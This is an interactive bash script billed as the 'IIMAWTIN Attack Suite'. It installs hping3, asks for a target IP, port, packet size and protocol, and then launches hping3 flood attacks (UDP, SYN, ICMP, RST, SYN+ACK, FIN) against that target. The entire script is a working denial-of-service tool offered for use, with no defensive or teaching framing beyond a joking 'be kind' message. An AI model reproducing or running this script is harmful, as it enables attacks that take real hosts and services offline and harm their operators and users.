#!/bin/bash

# Update package list and install necessary tools
echo "Updating package list and installing required tools..."
sudo apt update && sudo apt install -y nload hping3

# Clear the screen
clear

# Define the ASCII art for "IIMAWTIN"
cat << "EOF"
 _____                                              _____ 
( ___ )                                            ( ___ )
 |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   | 
 |   |                                              |   | 
 |   |                                              |   | 
 |   |   _ _                          _   _         |   | 
 |   |  (_|_)_ __ ___   __ ___      _| |_(_)_ __    |   | 
 |   |  | | | '_ ` _ \ / _` \ \ /\ / / __| | '_ \   |   | 
 |   |  | | | | | | | | (_| |\ V  V /| |_| | | | |  |   | 
 |   |  |_|_|_| |_| |_|\__,_| \_/\_/  \__|_|_| |_|  |   | 
 |   |                                              |   | 
 |   |                                              |   | 
 |   |                                              |   | 
 |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___| 
(_____)                                            (_____)
EOF

# Print the welcome message
echo "Welcome to the IIMAWTIN Attack Suite"
echo "---------------------------------------------------"
echo "Remember: Do Not Fuck anybody without any reason (be kind♥)."
echo "---------------------------------------------------"

# Brief pause before continuing
sleep 2

# Function to perform UDP flood attack
udp_flood() {
    echo "Starting UDP flood attack on $1 on port $2 with $3 bytes of data..."
    sudo hping3 --flood --udp -d $3 -p $2 $1
}

# Function to perform TCP flood attack
tcp_flood() {
    echo "Starting TCP flood attack on $1 on port $2 with $3 bytes of data..."
    sudo hping3 -S $1 -p $2 -d $3 $1 --flood
}

# Function to perform ICMP flood attack
icmp_flood() {
    echo "Starting ICMP flood attack on $1 on port $2 with $3 bytes of data..."
    # Note: ICMP doesn't actually use ports, but the port variable is kept for consistency
    sudo hping3 --flood --icmp -d $3 $1
}

# Function to perform RST flood attack
rst_flood() {
    echo "Starting RST flood attack on $1 on port $2 with $3 bytes of data..."
    sudo hping3 -R --flood -d $3 -p $2 $1
}

# Function to perform SYN+ACK flood attack
synack_flood() {
    echo "Starting SYN+ACK flood attack on $1 on port $2 with $3 bytes of data..."
    sudo hping3 -A -S --flood -d $3 -p $2 $1
}

# Function to perform FIN flood attack
fin_flood() {
    echo "Starting FIN flood attack on $1 on port $2 with $3 bytes of data..."
    sudo hping3 --flood -F -p $2 $1
}

# Ask the user which protocol they want to use
echo "What protocol do you want to attack with?"
echo "1) UDP"
echo "2) TCP"
echo "3) ICMP"
echo "4) RST"
echo "5) SYN+ACK"
echo "6) FIN"
read -p "Enter the number of the protocol: " protocol_choice

# Ask the user for the IP address to attack
read -p "Enter the IP address you want to attack: " target_ip

# Ask the user for the port number
read -p "Enter the port number: " target_port

# Ask the user for the data packet size
read -p "Enter the size of data packets in bytes: (For Fuck : 7828128) " data_size

# Execute the selected attack
case $protocol_choice in
    1)
        udp_flood $target_ip $target_port $data_size
        ;;
    2)
        tcp_flood $target_ip $target_port $data_size
        ;;
    3)
        icmp_flood $target_ip $target_port $data_size
        ;;
    4)
        rst_flood $target_ip $target_port $data_size
        ;;
    5)
        synack_flood $target_ip $target_port $data_size
        ;;
    6)
        fin_flood $target_ip $target_port $data_size
        ;;
    *)
        echo "Invalid choice. Please select 1, 2, 3, 4, 5, or 6."
        ;;
esac
